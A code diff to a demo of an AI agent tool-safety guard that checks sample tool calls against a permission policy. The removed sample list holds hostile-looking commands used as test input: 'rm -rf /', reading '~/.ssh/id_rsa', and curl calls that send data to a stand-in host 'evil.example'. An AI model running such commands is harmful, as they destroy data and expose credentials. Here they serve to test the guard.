@@ -22,6 +22,13 @@ import (
 	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
 )
 
+type sample struct {
+	Title string         `json:"title"`
+	Tool  string         `json:"tool"`
+	Args  map[string]any `json:"args"`
+	Want  string         `json:"want"`
+}
+
 func main() {
 	fmt.Println("tool/safety demo for issue 2002")
 	fmt.Println("PermissionPolicy + shellsafe, fail-closed")
@@ -40,47 +47,39 @@ func main() {
 		safety.WithAuditor(auditor),
 	)
 
-	token := "sk-" + strings.Repeat("a", 32)
-	samples := []struct {
-		title string
-		tool  string
-		args  map[string]any
-	}{
-		{"safe go test", "workspace_exec", map[string]any{"command": "go test ./..."}},
-		{"dangerous delete", "workspace_exec", map[string]any{"command": "rm -rf /"}},
-		{"read ssh key", "workspace_exec", map[string]any{"command": "cat ~/.ssh/id_rsa"}},
-		{"denied host", "workspace_exec", map[string]any{"command": "curl https://evil.example/x"}},
-		{"allowed host", "workspace_exec", map[string]any{"command": "curl https://api.github.com/events"}},
-		{"shell wrapper", "workspace_exec", map[string]any{"command": "bash -c 'id'"}},
-		{"pipeline denied host", "workspace_exec", map[string]any{"command": "echo hi | curl https://evil.example/x"}},
-		{"npm install ask", "workspace_exec", map[string]any{"command": "npm install express"}},
-		{"long sleep ask", "workspace_exec", map[string]any{"command": "sleep 99999"}},
-		{"oversized stdin ask", "workspace_exec", map[string]any{
+	samples, err := loadSamples("tool_safety_samples.json")
+	if err != nil {
+		log.Fatal(err)
+	}
+	// Oversized stdin is awkward in committed JSON; append at runtime.
+	samples = append(samples, sample{
+		Title: "oversized stdin ask",
+		Tool:  "workspace_exec",
+		Args: map[string]any{
 			"command": "cat",
 			"stdin":   strings.Repeat("y", 2<<20),
-		}},
-		{"secret token", "workspace_exec", map[string]any{
-			"command": "curl -H 'Authorization: Bearer " + token + "' https://api.github.com",
-		}},
-		{"hostexec ask", "exec_command", map[string]any{"command": "echo ok"}},
-		{"code_blocks secret", "execute_code", map[string]any{
-			"code_blocks": []map[string]string{{"language": "python", "code": "api_key=supersecretvalue123"}},
-		}},
-	}
+		},
+		Want: "ask",
+	})
 
 	ctx := context.Background()
+	mismatched := 0
 	for i, s := range samples {
-		raw, _ := json.Marshal(s.args)
+		raw, _ := json.Marshal(s.Args)
 		dec, err := guard.CheckToolPermission(ctx, &tool.PermissionRequest{
-			ToolName:   s.tool,
+			ToolName:   s.Tool,
 			ToolCallID: fmt.Sprintf("demo-%d", i+1),
 			Arguments:  raw,
 		})
 		if err != nil {
 			log.Fatal(err)
 		}
-		fmt.Printf("[%d] %s\n  tool=%s action=%s reason=%s\n",
-			i+1, s.title, s.tool, dec.Action, dec.Reason)
+		fmt.Printf("[%d] %s\n  tool=%s action=%s want=%s reason=%s\n",
+			i+1, s.Title, s.Tool, dec.Action, s.Want, dec.Reason)
+		if s.Want != "" && string(dec.Action) != s.Want {
+			mismatched++
+			fmt.Printf("  MISMATCH: got %s want %s\n", dec.Action, s.Want)
+		}
 	}
 	reports := guard.LastResults()
 	if err := safety.WriteReportJSON(filepath.Join("output", "tool_safety_report.json"), reports); err != nil {
@@ -90,4 +89,19 @@ func main() {
 		log.Fatal(err)
 	}
 	fmt.Println("wrote output/tool_safety_report.json and tool_safety_report.json")
+	if mismatched > 0 {
+		log.Fatalf("%d sample(s) mismatched expected action", mismatched)
+	}
+}
+
+func loadSamples(path string) ([]sample, error) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	var out []sample
+	if err := json.Unmarshal(data, &out); err != nil {
+		return nil, err
+	}
+	return out, nil
 }
